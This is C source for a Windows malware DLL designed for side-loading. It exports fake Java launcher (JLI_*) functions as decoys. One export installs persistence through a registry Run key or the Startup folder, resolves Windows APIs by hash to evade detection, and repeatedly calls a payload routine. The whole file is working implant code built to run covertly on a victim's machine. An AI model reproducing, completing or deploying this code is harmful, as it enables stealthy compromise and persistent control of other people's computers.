#include <stdio.h>
#include <Windows.h>
#include <Wininet.h>

#include "HellsHall.h"
#include "Core.h"
#include "Structs.h"
#include "ApiHashing.h"
#include "Run.h"
#include "Persist.h"

#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "advapi32.lib")

//#define _LNK_ 

BOOL decoy(){return TRUE;}

extern __declspec(dllexport) void JLI_GetStdArgc() { decoy(); }
extern __declspec(dllexport) void JLI_Launch() { decoy(); }
extern __declspec(dllexport) void JLI_MemAlloc() { decoy(); }
extern __declspec(dllexport) void JLI_GetStdArgs() { decoy(); }
extern __declspec(dllexport) void JLI_CmdToArgs() {

#ifdef _LNK_
    PersistViaStartup();
#else
    PersistViaRegKey(); 
#endif

    fnSleep pSleep = (fnSleep)GetProcAddressH(GetModuleHandleH(0x377D97D5), 0x9EEBBA37);
    int retries = 0;
    const int maxRetries = 10;
    while (!Run() && retries < maxRetries) {
        pSleep(3 * 1000);                       
        retries++;
    }
    if (retries == maxRetries) {
        return;
    }
}

BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved )
{

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

